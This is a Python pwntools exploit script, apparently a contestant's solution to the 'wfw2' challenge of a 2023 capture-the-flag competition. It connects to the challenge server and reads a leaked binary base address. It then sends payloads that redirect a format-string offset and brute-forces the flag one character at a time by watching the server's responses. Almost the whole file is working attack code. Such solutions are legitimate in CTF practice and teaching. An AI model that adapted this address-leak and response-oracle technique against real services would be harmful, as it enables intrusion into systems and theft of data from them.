from pwn import *
import string

gud = string.printable

context.binary = exe = ELF('./chal')
libc = ELF('./libc.so.6')
scrib ='''break main+251
c'''

#io = process()
#gdb.attach(io, api=True)
flag = 'CTF{impr355iv'
while(flag[len(flag)-1] != '}'):
    print(flag)
    found = 1
    for c in gud:
        if c == 'v':
            found = 1
        if not found:
            continue
        log.info(f'At char {c}')
        io = remote('wfw2.2023.ctfcompetition.com', 1337)
        query = c + 'x0 0'
        io.recvuntil(b'fluff\n')
        exe.address = int(io.recvuntil(b'-')[:-1], 16)
        first_str = exe.address + 0x20d5
        fmt = exe.address + 8380
        hidden = exe.address + 5184

        io.recvuntil(b'\n\n\n')

        idx = len(flag)
        payload = f'{hex(fmt - idx)} {1 + idx}'.encode()
        io.sendline(payload)
        io.sendline(query.encode())
        try:
            io.sendline(query.encode())
            io.sendline(query.encode())
            io.sendline(query.encode())
            io.sendline(query.encode())
            io.recv(timeout=1)
            flag += c
            break
            io.close()
        except:
            io.close()


io.interactive()